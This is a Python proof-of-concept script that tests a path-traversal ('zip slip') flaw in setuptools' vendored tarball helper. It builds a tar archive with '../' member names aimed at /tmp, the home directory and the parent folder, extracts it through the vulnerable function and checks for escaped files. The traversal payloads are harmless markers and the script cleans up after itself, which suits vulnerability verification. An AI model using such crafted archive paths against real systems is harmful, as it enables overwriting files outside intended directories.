import io
import os
import shutil
import tarfile
import tempfile

from setuptools._vendor.jaraco.context import strip_first_component


def create_malicious_tarball():
    tar_data = io.BytesIO()
    with tarfile.open(fileobj=tar_data, mode='w') as tar:
        # Create a malicious file path with traversal sequences
        malicious_files = [
            # Attempt 1: Simple traversal to /tmp
            {
                'path': 'dummy_dir/../../tmp/pwned_by_zipslip.txt',
                'content': b'[ZIPSLIP] File written to /tmp via path traversal!',
                'name': 'pwned_via_tmp',
            },
            # Attempt 2: Try to write to home directory
            {
                'path': 'dummy_dir/../../../../home/pwned_home.txt',
                'content': b'[ZIPSLIP] Attempted write to home directory',
                'name': 'pwned_via_home',
            },
            # Attempt 3: Try to write to current directory parent
            {
                'path': 'dummy_dir/../escaped.txt',
                'content': b'[ZIPSLIP] File in parent directory!',
                'name': 'pwned_escaped',
            },
            # Attempt 4: Legitimate file for comparison
            {
                'path': 'dummy_dir/legitimate_file.txt',
                'content': b'This file stays in target directory',
                'name': 'legitimate',
            },
        ]
        for file_info in malicious_files:
            content = file_info['content']
            tarinfo = tarfile.TarInfo(name=file_info['path'])
            tarinfo.size = len(content)
            tar.addfile(tarinfo, io.BytesIO(content))

    tar_data.seek(0)
    return tar_data


def exploit_zipslip():
    print("[*] Target: setuptools._vendor.jaraco.context.tarball()")

    # Create temporary directory for extraction
    temp_base = tempfile.mkdtemp(prefix="zipslip_test_")
    target_dir = os.path.join(temp_base, "extraction_target")

    try:
        os.mkdir(target_dir)
        print(f"[+] Created target extraction directory: {target_dir}")

        # Create malicious tarball
        print("[*] Creating malicious tar archive...")
        tar_data = create_malicious_tarball()

        try:
            with tarfile.open(fileobj=tar_data, mode='r') as tf:
                for member in tf:
                    # Apply the ACTUAL vulnerable function from setuptools
                    processed_member = strip_first_component(member, target_dir)
                    print(
                        f"[*] Extracting: {member.name:40} -> {processed_member.name}"
                    )

                    # Extract to target directory
                    try:
                        tf.extract(processed_member, path=target_dir)
                        print("    ✓ Extracted successfully")
                    except (PermissionError, FileNotFoundError) as e:
                        print(f"    ! {type(e).__name__}: Path traversal ATTEMPTED")
        except Exception as e:
            print(f"[!] Extraction raised exception: {type(e).__name__}: {e}")

        # Check results
        print("[*] Checking for extracted files...")

        # Check target directory
        print(f"[*] Files in target directory ({target_dir}):")
        if os.path.exists(target_dir):
            for root, _, files in os.walk(target_dir):
                level = root.replace(target_dir, '').count(os.sep)
                indent = ' ' * 2 * level
                print(f"{indent}{os.path.basename(root)}/")
                subindent = ' ' * 2 * (level + 1)
                for file in files:
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r') as f:
                            content = f.read()[:50]
                        print(f"{subindent}{file}")
                        print(f"{subindent}  └─ {content}...")
                    except:
                        print(f"{subindent}{file} (binary)")
        else:
            print("[!] Target directory not found!")

        print()
        print("[*] Checking for traversal attempts...")
        print()

        # Check if files escaped
        traversal_attempts = [
            ("/tmp/pwned_by_zipslip.txt", "Escape to /tmp"),
            (os.path.expanduser("~/pwned_home.txt"), "Escape to home"),
            (os.path.join(temp_base, "escaped.txt"), "Escape to parent"),
        ]

        escaped = False
        for check_path, description in traversal_attempts:
            if os.path.exists(check_path):
                print(f"[+] Path Traversal Confirmed: {description}")
                print(f"      File created at: {check_path}")
                try:
                    with open(check_path, 'r') as f:
                        content = f.read()
                    print(f"      Content: {content}")
                    print(f"      Removing: {check_path}")
                    os.remove(check_path)
                except Exception as e:
                    print(f"      Error reading: {e}")
                escaped = True
            else:
                print(f"[-] OK: {description} - No escape detected")

        if escaped:
            print("[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed!")
        else:
            print("[-] No path traversal detected (mitigation in place)")

    finally:
        # Cleanup
        print()
        print(f"[*] Cleaning up: {temp_base}")
        try:
            shutil.rmtree(temp_base)
        except Exception as e:
            print(f"[!] Cleanup error: {e}")
